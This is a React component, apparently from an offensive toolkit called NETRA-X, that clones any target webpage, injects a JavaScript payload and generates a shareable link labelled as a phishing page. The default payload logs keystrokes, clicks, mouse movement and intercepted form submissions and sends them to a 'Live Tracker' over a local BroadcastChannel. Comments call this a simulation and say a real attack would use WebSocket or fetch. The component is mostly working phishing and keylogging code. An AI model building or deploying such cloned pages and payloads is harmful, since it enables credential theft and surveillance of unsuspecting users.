
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import Link from 'next/link';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Wand, Share2, Clipboard, Globe } from 'lucide-react';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { Label } from '@/components/ui/label';

const formSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
  jsPayload: z.string().min(1, 'JavaScript Payload cannot be empty.'),
});

const defaultJsPayload = `
// NETRA-X Advanced Data Exfiltration Payload
(function() {
    // A real-world C2 channel would be a WebSocket or frequent fetch/XHR calls.
    // For this simulation, we use BroadcastChannel to send data to the attacker's
    // 'Live Tracker' UI running in another tab in the same browser.
    const channel = new BroadcastChannel('netrax_c2_channel');
    
    // Assign a unique ID to this "victim" session
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        const payload = {
            sessionId: sessionId,
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
        };
        channel.postMessage(payload);
        console.log('Exfiltrating:', payload);
    }

    exfiltrate('connection', { message: 'Payload activated on page.' });

    // --- Keystrokes ---
    document.addEventListener('keydown', (e) => {
        let value = e.key;
        if (e.target.type === 'password') {
            value = '[PASSWORD_FIELD]';
        }
        exfiltrate('keystroke', { 
            key: value, 
            target: e.target.name || e.target.id || e.target.tagName 
        });
    }, true);

    // --- Clicks ---
    document.addEventListener('click', (e) => {
        exfiltrate('click', { 
            x: e.clientX, 
            y: e.clientY, 
            target: e.target.tagName,
            id: e.target.id || 'none',
            text: e.target.innerText ? e.target.innerText.substring(0, 50) : ''
        });
    }, true);

    // --- Mouse Movement ---
    let lastMove = 0;
    document.addEventListener('mousemove', (e) => {
        if (Date.now() - lastMove > 200) { // Throttle logging
            exfiltrate('mousemove', { x: e.clientX, y: e.clientY });
            lastMove = Date.now();
        }
    });

    // --- Form Submissions ---
    document.addEventListener('submit', (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        exfiltrate('form-submit', { data });
        // In a real attack, you might let the form submit after a delay.
        // For this demo, we just capture and log.
        console.log('Form submission intercepted:', data);
    }, true);
})();
`;

export function AdvancedPageCloner() {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isHosting, setIsHosting] = useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: 'https://google.com',
      jsPayload: defaultJsPayload.trim(),
    },
  });

  const processAndInject = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      toast({ title: 'Cloning Page...', description: 'Fetching DOM from the target URL.' });
      const response = await clonePageFromUrl({ url: values.targetUrl });
      let html = response.htmlContent;
      
      const scriptToInject = `<script>${values.jsPayload}</script>`;
      
      if (html.includes('</body>')) {
          html = html.replace(/<\/body>/i, `${scriptToInject}</body>`);
      } else {
          html += scriptToInject;
      }
      
      // Inject base tag to fix relative links
      if (html.includes('<head>')) {
        html = html.replace(/<head>/i, `<head>\\n<base href="${values.targetUrl}">`);
      } else {
        html = `<head><base href="${values.targetUrl}"></head>${html}`;
      }
      
      setModifiedHtml(html);
      toast({ title: 'Injection Complete', description: 'JavaScript payload has been injected.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Cloning Failed', description: error });
    } finally {
      setIsLoading(false);
    }
  };

  const handleGenerateLink = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    setHostedUrl(null);
    
    try {
        const pageId = crypto.randomUUID();
        const pageStorageKey = `phishing-html-${pageId}`;
        localStorage.setItem(pageStorageKey, modifiedHtml);

        const finalUrl = `${window.location.origin}/phish/${pageId}`;
        setHostedUrl(finalUrl);
        toast({ title: "Local Link Generated!", description: "Your advanced attack page is ready." });

        logActivity({
            user: user?.displayName || 'Operator',
            action: 'Created Advanced Cloned Page',
            details: `Target: ${form.getValues('targetUrl')}`,
        });
    } catch(err) {
        const error = err instanceof Error ? err.message : "An unknown error occurred";
        toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
    } finally {
        setIsHosting(false);
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>Advanced Webpage Cloner (with JS Injection)</CardTitle>
        <CardDescription>Clone a page and inject a custom JavaScript payload to monitor real-time user interactions.</CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(processAndInject)} className="space-y-4">
             <FormField
              control={form.control}
              name="targetUrl"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Target URL</FormLabel>
                  <FormControl>
                    <Input placeholder="https://example.com" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="jsPayload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>JavaScript Payload to Inject</FormLabel>
                  <FormControl>
                    <Textarea placeholder="// Your custom JS code here..." {...field} className="font-mono h-48"/>
                  </FormControl>
                   <CardDescription>The output of this script will be sent to the <Link href="/live-tracker" className="text-accent underline">Live Tracker</Link> page.</CardDescription>
                  <FormMessage />
                </FormItem>
              )}
            />
            <div className="flex flex-col sm:flex-row gap-2">
                <Button type="submit" disabled={isLoading} className="w-full sm:w-auto">
                    {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
                    Clone & Inject JS
                </Button>
                <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full sm:w-auto">
                    {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
                    Generate Local Link
                </Button>
            </div>
          </form>
        </Form>
      </CardContent>
      {hostedUrl && (
          <CardFooter className="flex-col items-start gap-4 border-t pt-6">
            <h3 className="font-semibold">Live Attack Page URL</h3>
            <div className="w-full flex items-center gap-2">
                <Input readOnly value={hostedUrl} className="font-mono" />
                <Button type="button" size="icon" variant="outline" onClick={() => {
                    navigator.clipboard.writeText(hostedUrl);
                    toast({ title: 'Copied!'});
                }}>
                    <Clipboard className="h-4 w-4" />
                </Button>
                 <Button type="button" size="icon" variant="outline" asChild>
                    <Link href={hostedUrl} target="_blank"><Globe className="h-4 w-4" /></Link>
                </Button>
            </div>
          </CardFooter>
      )}
    </Card>
  );
}
